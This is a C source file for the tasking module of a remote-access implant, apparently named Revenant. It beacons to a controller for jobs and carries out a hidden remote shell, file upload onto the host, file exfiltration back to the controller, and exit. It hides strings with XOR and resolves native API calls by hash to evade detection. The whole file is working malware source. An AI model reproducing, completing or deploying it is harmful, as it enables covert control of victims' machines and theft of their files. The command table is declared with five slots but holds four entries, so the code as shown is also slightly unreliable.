#include "Asm.h"
#include "Defs.h"
#include "Core.h"
#include "Config.h"
#include "Package.h"
#include "Command.h"
#include "Revenant.h"
#include "Obfuscation.h"
#include "Utilities.h"

#include <tchar.h>

#define RVNT_COMMAND_LENGTH 5

RVNT_COMMAND Commands[RVNT_COMMAND_LENGTH] = {
        { .ID = COMMAND_SHELL,            .Function = CommandShell },
        { .ID = COMMAND_DOWNLOAD,         .Function = CommandDownload },
        { .ID = COMMAND_UPLOAD,           .Function = CommandUpload },
        { .ID = COMMAND_EXIT,             .Function = CommandExit },
};

VOID CommandDispatcher() {
    PPACKAGE Package     = NULL;
    PARSER   Parser      = { 0 };
    PVOID    DataBuffer  = NULL;
    SIZE_T   DataSize    = 0;
    DWORD    TaskCommand;

    do {
        if(!Instance.Session.Connected) {


//--------------------------------
#if CONFIG_OBFUSCATION
            unsigned char s_xk[] = S_XK;
            unsigned char s_string[] = S_INSTANCE_NOT_CONNECTED;
            // _tprintf("%s\n", xor_dec((char *)s_string, sizeof(s_string), (char *)s_xk, sizeof(s_xk)));
#else
            // _tprintf("instance not connected!\n");
#endif
//--------------------------------

            return;
        }

        Sleep( Instance.Config.Sleeping * 1000 );

        Package = PackageCreate( COMMAND_GET_JOB );

        PackageAddInt32( Package, Instance.Session.AgentID );
        PackageTransmit( Package, &DataBuffer, &DataSize );

        if(DataBuffer && DataSize > 0) {
            // PRINT_HEX(DataBuffer, (int)DataSize)
            ParserNew(&Parser, DataBuffer, DataSize);
            do {
                TaskCommand = ParserGetInt32(&Parser);
                if(TaskCommand != COMMAND_NO_JOB) {
                    // _tprintf( "Task => CommandID:[%lu : %lx]\n", TaskCommand, TaskCommand );

                    BOOL FoundCommand = FALSE;
                    for ( UINT32 FunctionCounter = 0; FunctionCounter < RVNT_COMMAND_LENGTH; FunctionCounter++ ) {
                        if ( Commands[FunctionCounter].ID == TaskCommand) {
                            Commands[FunctionCounter].Function(&Parser);
                            FoundCommand = TRUE;
                            break;
                        }
                    }


                    if ( ! FoundCommand ) {

//--------------------------------
#if CONFIG_OBFUSCATION
                        unsigned char s_xk[] = S_XK;
                        unsigned char s_string[] = S_COMMAND_NOT_FOUND;
                        // _tprintf("%s\n", xor_dec((char *)s_string, sizeof(s_string), (char *)s_xk, sizeof(s_xk)));
#else
                        // _tprintf("command not found\n");
#endif
//--------------------------------

                    }
                } else {

//--------------------------------
#if CONFIG_OBFUSCATION
                    unsigned char s_xk[] = S_XK;
                    unsigned char s_string[] = S_IS_COMMAND_NO_JOB;
                    // _tprintf("%s\n", xor_dec((char *)s_string, sizeof(s_string), (char *)s_xk, sizeof(s_xk)));
#else
                    // _tprintf("Is COMMAND_NO_JOB\n");
#endif
//--------------------------------

                }
            } while ( Parser.Length > 4 );

            mem_set(DataBuffer, 0, DataSize);
            LocalFree(*(PVOID *)DataBuffer);
            DataBuffer = NULL;

            ParserDestroy(&Parser);
        } else {

//--------------------------------
#if CONFIG_OBFUSCATION
            unsigned char s_xk[] = S_XK;
            unsigned char s_string[] = S_TRANSPORT_FAILED;
            // _tprintf("%s\n", xor_dec((char *)s_string, sizeof(s_string), (char *)s_xk, sizeof(s_xk)));
#else
            // _tprintf("Transport: Failed\n");
#endif
//--------------------------------

            break;
        }

    } while(TRUE);

    Instance.Session.Connected = FALSE;
}

VOID CommandShell( PPARSER Parser ){

#if defined(CONFIG_ARCH) && (CONFIG_ARCH == 64)
    void *p_ntdll = get_ntdll_64();
#else
    void *p_ntdll = get_ntdll_32();
#endif //CONFIG_ARCH
//--------------------------------
#if CONFIG_OBFUSCATION
    unsigned char s_xk[] = S_XK;
    unsigned char s_string[] = S_COMMAND_SHELL;
    // _tprintf("%s\n", xor_dec((char *)s_string, sizeof(s_string), (char *)s_xk, sizeof(s_xk)));
#else
    // _tprintf("Command::Shell\n");
#endif
//---------------------------------
#if CONFIG_NATIVE

    DWORD   Length           = 0;
    PCHAR   Command          = NULL;
    HANDLE  hStdInPipeRead   = NULL;
    HANDLE  hStdInPipeWrite  = NULL;
    HANDLE  hStdOutPipeRead  = NULL;
    HANDLE  hStdOutPipeWrite = NULL;

    SECURITY_ATTRIBUTES SecurityAttr    = { sizeof( SECURITY_ATTRIBUTES ), NULL, TRUE };

    Command = ParserGetBytes(Parser, (PUINT32) &Length);

    if (CreatePipe(&hStdInPipeRead, &hStdInPipeWrite, &SecurityAttr, 0 ) == FALSE )
        return;

    if (CreatePipe( &hStdOutPipeRead, &hStdOutPipeWrite, &SecurityAttr, 0 ) == FALSE )
        return;

    UNICODE_STRING nt_image_path;
    UNICODE_STRING nt_args;
    UNICODE_STRING nt_command_line;

    void *p_rtl_init_unicode_string = get_proc_address_by_hash(p_ntdll, RtlInitUnicodeString_CRC32B);
    RtlInitUnicodeString_t g_rtl_init_unicode_string = (RtlInitUnicodeString_t) p_rtl_init_unicode_string;

    // hardcoded test string
    //g_rtl_init_unicode_string(&nt_image_path, (PWSTR)L"\\??\\C:\\Windows\\System32\\cmd.exe");


    // split command and args
    char command_str[MAX_PATH];
    char arg_str[MAX_PATH];

    // copy command line (cmd.exe /c XXXXX)
    mem_cpy(command_str,Command,Length);

    // split command line
    char ** command_array = split_first_space(command_str);

    // get command file path
    char * cmd_file = str_dup(command_array[0]);

    // get args
    mem_cpy(arg_str,command_array[1],str_len(command_array[1]));
    arg_str[str_len(command_array[1])] = 0x0;

    // normalize command file path
    normalize_path(cmd_file);

    // make wide command and args
    PWSTR wide_command = str_to_wide(cmd_file);
    PWSTR wide_args = str_to_wide(arg_str);

    // make the command line
    PWCHAR command_line = wide_concat(wide_concat(wide_command, L" "),wide_args);

    // unicode str
    g_rtl_init_unicode_string(&nt_image_path, wide_command);
    g_rtl_init_unicode_string(&nt_args, wide_args);
    //g_rtl_init_unicode_string(&nt_command_line, command_line);

    // _tprintf("Command Line:%ls\n", command_line);

    PRTL_USER_PROCESS_PARAMETERS proc_params = { 0 };

    // create process params struct
    void *p_rtl_create_process_parameters_ex = get_proc_address_by_hash(p_ntdll, RtlCreateProcessParametersEx_CRC32B);
    RtlCreateProcessParametersEx_t g_rtl_create_process_parameters_ex = (RtlCreateProcessParametersEx_t) p_rtl_create_process_parameters_ex;
    g_rtl_create_process_parameters_ex(&proc_params, &nt_image_path, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 0x01);

    // create info struct
    PS_CREATE_INFO create_info = { 0 };
    create_info.Size = sizeof(create_info);
    create_info.State = PsCreateInitialState;

    // set some parameters
    proc_params->CommandLine.Buffer = command_line;
    proc_params->CommandLine.Length = MAX_PATH;
    proc_params->WindowFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES; // Hide Window 0x00000001 | Use STD handles 0x100

    // Setup handle array
    HANDLE handle_array[3] = { hStdInPipeRead, hStdOutPipeWrite, hStdOutPipeWrite };

    // set std error/out/in:
    proc_params->StandardError   = handle_array[2];
    proc_params->StandardOutput  = handle_array[1];
    proc_params->StandardInput   = handle_array[0];

    // allocate process heap
    void *p_rtl_allocate_heap = get_proc_address_by_hash(p_ntdll, RtlAllocateHeap_CRC32B);
    RtlAllocateHeap_t g_rtl_allocate_heap = (RtlAllocateHeap_t) p_rtl_allocate_heap;

    // get heaps
    void *p_rtl_get_process_heaps = get_proc_address_by_hash(p_ntdll, RtlGetProcessHeaps_CRC32B);
    RtlGetProcessHeaps_t g_rtl_get_process_heaps = (RtlGetProcessHeaps_t) p_rtl_get_process_heaps;

    // make attributes
    OBJECT_ATTRIBUTES obj_attrib = {sizeof(OBJECT_ATTRIBUTES)};
    PPS_STD_HANDLE_INFO std_handle_info = (PPS_STD_HANDLE_INFO)g_rtl_allocate_heap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_STD_HANDLE_INFO));
    PCLIENT_ID client_id = (PCLIENT_ID)g_rtl_allocate_heap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE));
    PPS_ATTRIBUTE_LIST attrib_list = (PS_ATTRIBUTE_LIST *)g_rtl_allocate_heap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(PS_ATTRIBUTE_LIST));
    PSECTION_IMAGE_INFORMATION sec_img_info = (PSECTION_IMAGE_INFORMATION)g_rtl_allocate_heap(RtlProcessHeap(), HEAP_ZERO_MEMORY, sizeof(SECTION_IMAGE_INFORMATION));

    attrib_list->TotalLength = sizeof(PS_ATTRIBUTE_LIST) - (sizeof(PS_ATTRIBUTE));
    attrib_list->Attributes[0].Attribute = PS_ATTRIBUTE_IMAGE_NAME;
    attrib_list->Attributes[0].Size = nt_image_path.Length;
    attrib_list->Attributes[0].Value = (ULONG_PTR)nt_image_path.Buffer;

    NTSTATUS status;
    HANDLE h_proc, h_thread = NULL;
    void *p_nt_create_user_process = get_proc_address_by_hash(p_ntdll, NtCreateUserProcess_CRC32B);
    NtCreateUserProcess_t g_nt_create_user_process = (NtCreateUserProcess_t) p_nt_create_user_process;
    if((status = g_nt_create_user_process(&h_proc, &h_thread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS, NULL, NULL, PROCESS_CREATE_FLAGS_INHERIT_HANDLES, 0, proc_params, &create_info, attrib_list)) != 0x0) {
        // _tprintf("PROCESS CREATION FAILED!\n");
        // _tprintf("STATUS:%08x\n", status);
    }
    void *p_rtl_free_heap = get_proc_address_by_hash(p_ntdll, RtlFreeHeap_CRC32B);
    RtlFreeHeap_t g_rtl_free_heap = (RtlFreeHeap_t) p_rtl_free_heap;
    g_rtl_free_heap(RtlProcessHeap(), 0, attrib_list);
    g_rtl_free_heap(RtlProcessHeap(), 0, sec_img_info);
    g_rtl_free_heap(RtlProcessHeap(), 0, client_id);

    void *p_rtl_destroy_process_parameters = get_proc_address_by_hash(p_ntdll, RtlDestroyProcessParameters_CRC32B);
    RtlDestroyProcessParameters_t g_rtl_destroy_process_parameters = (RtlDestroyProcessParameters_t) p_rtl_destroy_process_parameters;
    g_rtl_destroy_process_parameters(proc_params);

    CloseHandle( hStdOutPipeWrite );
    CloseHandle( hStdInPipeRead );

    AnonPipeRead( hStdOutPipeRead );

    CloseHandle( hStdOutPipeRead );
    CloseHandle( hStdInPipeWrite );

#else

    DWORD   Length           = 0;
    PCHAR   Command          = NULL;
    HANDLE  hStdInPipeRead   = NULL;
    HANDLE  hStdInPipeWrite  = NULL;
    HANDLE  hStdOutPipeRead  = NULL;
    HANDLE  hStdOutPipeWrite = NULL;

    PROCESS_INFORMATION ProcessInfo     = { };
    SECURITY_ATTRIBUTES SecurityAttr    = { sizeof( SECURITY_ATTRIBUTES ), NULL, TRUE };
    STARTUPINFOA        StartUpInfoA    = { };

    Command = ParserGetBytes(Parser, (PUINT32) &Length);

    if (CreatePipe(&hStdInPipeRead, &hStdInPipeWrite, &SecurityAttr, 0 ) == FALSE )
        return;

    if (CreatePipe( &hStdOutPipeRead, &hStdOutPipeWrite, &SecurityAttr, 0 ) == FALSE )
        return;

    StartUpInfoA.cb         = sizeof( STARTUPINFOA );

    StartUpInfoA.dwFlags    = STARTF_USESTDHANDLES;
    StartUpInfoA.hStdError  = hStdOutPipeWrite;
    StartUpInfoA.hStdOutput = hStdOutPipeWrite;
    StartUpInfoA.hStdInput  = hStdInPipeRead;

    if ( CreateProcessA( NULL, Command, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &StartUpInfoA, &ProcessInfo ) == FALSE )
        return;

    CloseHandle( hStdOutPipeWrite );
    CloseHandle( hStdInPipeRead );

    AnonPipeRead( hStdOutPipeRead );

    CloseHandle( hStdOutPipeRead );
    CloseHandle( hStdInPipeWrite );
#endif // CONFIG_NATIVE

}

VOID CommandUpload( PPARSER Parser ) {

//--------------------------------
#if CONFIG_ARCH == 64
    void *p_ntdll = get_ntdll_64();
#else
    void *p_ntdll = get_ntdll_32();
#endif //CONFIG_ARCH


#if CONFIG_NATIVE
    unsigned char s_xk[] = S_XK;
    unsigned char s_string[] = S_COMMAND_UPLOAD;
    // _tprintf("%s\n", xor_dec((char *) s_string, sizeof(s_string), (char *) s_xk, sizeof(s_xk)));

    PPACKAGE Package = PackageCreate(COMMAND_UPLOAD);
    UINT32 FileSize = 0;
    UINT32 NameSize = 0;
    DWORD Written = 0;
    PCHAR FileName = ParserGetBytes(Parser, &NameSize);
    PVOID Content = ParserGetBytes(Parser, &FileSize);
    HANDLE hFile = NULL;

    FileName[NameSize] = 0;

    // FIX THIS STRING
    // _tprintf("FileName => %s (FileSize: %d)\n", FileName, FileSize);

    NTSTATUS status;
    UNICODE_STRING file_path;
    char file_name[MAX_PATH] = { 0 };
    mem_cpy(file_name,FileName, NameSize - 1);
    NameSize = NameSize - 1;

    // FIX THIS STRING
    // _tprintf("Before: %s\n", file_name);

    normalize_path(file_name);

    // FIX THIS STRING
    // _tprintf("Normalized: %s\n", file_name);

    WCHAR *w_file_path = str_to_wide(file_name);
    void *p_rtl_init_unicode_string = get_proc_address_by_hash(p_ntdll, RtlInitUnicodeString_CRC32B);
    RtlInitUnicodeString_t g_rtl_init_unicode_string = (RtlInitUnicodeString_t) p_rtl_init_unicode_string;
    g_rtl_init_unicode_string(&file_path, w_file_path);
    OBJECT_ATTRIBUTES obj_attrs;
    IO_STATUS_BLOCK io_status_block;


    InitializeObjectAttributes(&obj_attrs, &file_path, 0x00000040L, NULL, NULL);
    void *p_nt_create_file = get_proc_address_by_hash(p_ntdll, NtCreateFile_CRC32B);
    NtCreateFile_t g_nt_create_file = (NtCreateFile_t) p_nt_create_file;
    if ((status = g_nt_create_file(&hFile, FILE_GENERIC_WRITE, &obj_attrs, &io_status_block, NULL,
                                   FILE_ATTRIBUTE_NORMAL, FILE_SHARE_WRITE, FILE_OVERWRITE_IF,
                                   FILE_RANDOM_ACCESS | FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT, NULL,
                                   0)) != 0x0) {
        //_tprintf("[*] NtCreateFile: Failed[0x%lx]\n", status);
        goto Cleanup;
    }

    void *p_nt_write_file = get_proc_address_by_hash(p_ntdll, NtWriteFile_CRC32B);
    NtWriteFile_t g_nt_write_file = (NtWriteFile_t) p_nt_write_file;
    if ((status = g_nt_write_file(hFile, NULL, NULL, NULL, &io_status_block, Content, FileSize-1, 0, 0)) != 0x0) {
        //_tprintf("[*] NtWriteFile: Failed[0x%lx]\n", status);
        goto Cleanup;
    }

    Written = io_status_block.Information;

    PackageAddInt32(Package, FileSize-1);
    PackageAddBytes(Package, (PUCHAR) FileName, NameSize);
    PackageTransmit(Package, NULL, NULL);

    Cleanup:
    CloseHandle(hFile);
    hFile = NULL;

#else //CONFIG_NATIVE

    // _tprintf("Command::Upload\n");

    PPACKAGE Package  = PackageCreate( COMMAND_UPLOAD );
    UINT32   FileSize = 0;
    UINT32   NameSize = 0;
    DWORD    Written  = 0;
    PCHAR    FileName = ParserGetBytes( Parser, &NameSize );
    PVOID    Content  = ParserGetBytes( Parser, &FileSize );
    HANDLE   hFile    = NULL;

    FileName[ NameSize ] = 0;

    // _tprintf( "FileName => %s (FileSize: %d)\n", FileName, FileSize );

    hFile = CreateFileA( FileName, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL );

    if ( hFile == INVALID_HANDLE_VALUE ) {
        // _tprintf( "[*] CreateFileA: Failed[%ld]\n", GetLastError() );
        goto Cleanup;
    }

    if ( ! WriteFile( hFile, Content, FileSize, &Written, NULL)) {
        // _tprintf( "[*] WriteFile: Failed[%ld]\n", GetLastError() );
        goto Cleanup;
    }

    PackageAddInt32( Package, FileSize );
    PackageAddBytes( Package, (PUCHAR)FileName, NameSize );
    PackageTransmit( Package, NULL, NULL );

    Cleanup:
    CloseHandle( hFile );
    hFile = NULL;
#endif // CONFIG_NATIVE
}



VOID CommandDownload( PPARSER Parser ) {
#if CONFIG_ARCH == 64
    void *p_ntdll = get_ntdll_64();
#else
    void *p_ntdll = get_ntdll_32();
#endif //CONFIG_ARCH

//--------------------------------
#if CONFIG_NATIVE
    unsigned char s_xk[] = S_XK;
    unsigned char s_string[] = S_COMMAND_DOWNLOAD;
    // _tprintf("%s\n", xor_dec((char *)s_string, sizeof(s_string), (char *)s_xk, sizeof(s_xk)));

    PPACKAGE Package  = PackageCreate( COMMAND_DOWNLOAD );
    DWORD    FileSize = 0;
    DWORD    Read     = 0;
    DWORD    NameSize = 0;
    PCHAR    FileName = ParserGetBytes(Parser, (PUINT32) &NameSize);
    HANDLE   hFile    = NULL;
    PVOID    Content  = NULL;

    FileName[ NameSize ] = 0;
    //PCHAR FileName = "C:/Temp/test.txt\0";
    /*NameSize  = strlen(FileName);
    // _tprintf( "FileName => %s\n", FileName );
    // _tprintf("Old NameSize => %d\n", NameSize);
    // _tprintf("Strlen of FileName =>%d\n", strlen(FileName));
     */
    NTSTATUS status;
    UNICODE_STRING file_path;
    char file_name[MAX_PATH] = { 0 };
    mem_cpy(file_name,FileName, NameSize - 2);
    NameSize = strlen(file_name);

    // FIX THIS STRING
    // _tprintf("Before: %s\n", file_name);

    normalize_path(file_name);

    // FIX THIS STRING
    // _tprintf("Normalized: %s\n", file_name);


    WCHAR *w_file_path = str_to_wide(file_name);
    void *p_rtl_init_unicode_string = get_proc_address_by_hash(p_ntdll, RtlInitUnicodeString_CRC32B);
    RtlInitUnicodeString_t g_rtl_init_unicode_string = (RtlInitUnicodeString_t) p_rtl_init_unicode_string;
    g_rtl_init_unicode_string(&file_path, w_file_path);
    OBJECT_ATTRIBUTES obj_attrs;
    IO_STATUS_BLOCK io_status_block;

    InitializeObjectAttributes(&obj_attrs, &file_path, 0x00000040L, NULL, NULL);


    void *p_nt_open_file = get_proc_address_by_hash(p_ntdll, NtOpenFile_CRC32B);
    NtOpenFile_t g_nt_open_file = (NtOpenFile_t) p_nt_open_file;
    if((status = g_nt_open_file(&hFile, FILE_GENERIC_READ, &obj_attrs, &io_status_block, FILE_SHARE_READ, FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT)) != 0){
        //_tprintf("NtOpenFile: 0x%lx\n", status);
        goto CleanupDownload;
    }

    FILE_STANDARD_INFORMATION file_standard_info;
    void *p_nt_query_information_file = get_proc_address_by_hash(p_ntdll, NtQueryInformationFile_CRC32B);
    NtQueryInformationFile_t g_nt_query_information_file = (NtQueryInformationFile_t) p_nt_query_information_file;
    if((status = g_nt_query_information_file(hFile, &io_status_block, &file_standard_info, sizeof(FILE_STANDARD_INFORMATION), FileStandardInformation)) != 0x0) {
        // _tprintf("NtQueryInformationFile failed with status: 0x%lx\n", status);
        goto CleanupDownload;
    }

    FileSize = file_standard_info.EndOfFile.QuadPart;
    // _tprintf("file_size: %d\n", FileSize);
    Content  = LocalAlloc( LPTR, FileSize );

    void *p_nt_read_file = get_proc_address_by_hash(p_ntdll, NtReadFile_CRC32B);
    NtReadFile_t g_nt_read_file = (NtReadFile_t) p_nt_read_file;
    if((status = g_nt_read_file(hFile, NULL, NULL, NULL, &io_status_block, Content, FileSize, NULL, NULL)) != 0x0) {
        // _tprintf("NtReadFile failed with status: 0x%lx\n", status);
        goto CleanupDownload;
    }

    Read += io_status_block.Information;

    //Read = io_status_block.Information;
    PackageAddBytes( Package, FileName, NameSize);
    PackageAddBytes( Package, Content,  FileSize);

    PackageTransmit( Package, NULL, NULL );

#else //CONFIG_NATIVE
    // _tprintf("Command::Download\n");

//--------------------------------

    PPACKAGE Package  = PackageCreate( COMMAND_DOWNLOAD );
    DWORD    FileSize = 0;
    DWORD    Read     = 0;
    DWORD    NameSize = 0;
    PCHAR    FileName = ParserGetBytes(Parser, (PUINT32) &NameSize);
    HANDLE   hFile    = NULL;
    PVOID    Content  = NULL;

    FileName[ NameSize ] = 0;

    // _tprintf( "FileName => %s\n", FileName );

    hFile = CreateFileA( FileName, GENERIC_READ, 0, 0, OPEN_ALWAYS, 0, 0 );
    if ( ( ! hFile ) || ( hFile == INVALID_HANDLE_VALUE ) )
    {
        // _tprintf( "[*] CreateFileA: Failed[%ld]\n", GetLastError() );
        goto CleanupDownload;
    }

    FileSize = GetFileSize( hFile, 0 );
    Content  = LocalAlloc( LPTR, FileSize );

    if ( ! ReadFile( hFile, Content, FileSize, &Read, NULL ) )
    {
        // _tprintf( "[*] ReadFile: Failed[%ld]\n", GetLastError() );
        goto CleanupDownload;
    }

    PackageAddBytes( Package, FileName, NameSize );
    PackageAddBytes( Package, Content,  FileSize );

    PackageTransmit( Package, NULL, NULL );
#endif

    CleanupDownload:
    if ( hFile ){
        CloseHandle( hFile );
        hFile = NULL;
    }

    if ( Content ){
        mem_set( Content, 0, FileSize );
        LocalFree( Content );
        Content = NULL;
    }


}

VOID CommandExit( PPARSER Parser ) {

//--------------------------------
#if CONFIG_OBFUSCATION
    unsigned char s_xk[] = S_XK;
    unsigned char s_string[] = S_COMMAND_EXIT;
    // _tprintf("%s\n", xor_dec((char *)s_string, sizeof(s_string), (char *)s_xk, sizeof(s_xk)));
#else
    // _tprintf( "Command::Exit\n");
#endif
//--------------------------------

    ExitProcess( 0 );
}

